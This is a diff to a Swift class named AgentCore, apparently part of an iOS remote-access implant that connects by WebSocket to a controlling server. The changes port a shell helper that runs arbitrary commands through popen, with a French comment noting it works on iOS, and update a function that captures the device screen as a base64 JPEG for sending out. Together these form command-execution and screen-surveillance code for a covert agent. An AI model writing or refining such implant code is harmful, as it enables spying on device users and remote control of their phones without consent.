@@ -52,8 +52,8 @@ class AgentCore: NSObject, URLSessionWebSocketDelegate {
     }
 
     func connect() {
-        let url  = URL(string: "ws://\(SERVER_IP):\(SERVER_PORT)/agent")!
-        task     = session!.webSocketTask(with: url)
+        let url = URL(string: "ws://\(SERVER_IP):\(SERVER_PORT)/agent")!
+        task    = session!.webSocketTask(with: url)
         task!.resume()
         sendIdent()
         receive()
@@ -170,23 +170,27 @@ class AgentCore: NSObject, URLSessionWebSocketDelegate {
 
     // ─── HELPERS ─────────────────────────────────────────────────────────────
 
+    // popen — disponible sur iOS via Darwin, pas de Process nécessaire
     func shell(_ cmd: String) -> String {
-        let pipe = Pipe()
-        let proc = Process()
-        proc.launchPath = "/bin/sh"
-        proc.arguments  = ["-c", cmd]
-        proc.standardOutput = pipe
-        proc.standardError  = pipe
-        proc.launch()
-        proc.waitUntilExit()
-        return String(data: pipe.fileHandleForReading.readDataToEndOfFile(), encoding: .utf8) ?? ""
+        guard let pipe = popen(cmd, "r") else { return "popen failed" }
+        var output = ""
+        var buffer = [CChar](repeating: 0, count: 512)
+        while fgets(&buffer, Int32(buffer.count), pipe) != nil {
+            output += String(cString: buffer)
+        }
+        pclose(pipe)
+        return output
     }
 
     func captureScreen() -> String? {
-        let renderer = UIGraphicsImageRenderer(size: UIScreen.main.bounds.size)
+        let bounds   = UIScreen.main.bounds
+        let renderer = UIGraphicsImageRenderer(size: bounds.size)
         let img = renderer.image { _ in
-            UIApplication.shared.windows.first?
-                .drawHierarchy(in: UIScreen.main.bounds, afterScreenUpdates: true)
+            // iOS 15+ — UIWindowScene
+            let scene = UIApplication.shared.connectedScenes
+                .compactMap { $0 as? UIWindowScene }
+                .first
+            scene?.windows.first?.drawHierarchy(in: bounds, afterScreenUpdates: true)
         }
         return img.jpegData(compressionQuality: 0.5)?.base64EncodedString()
     }
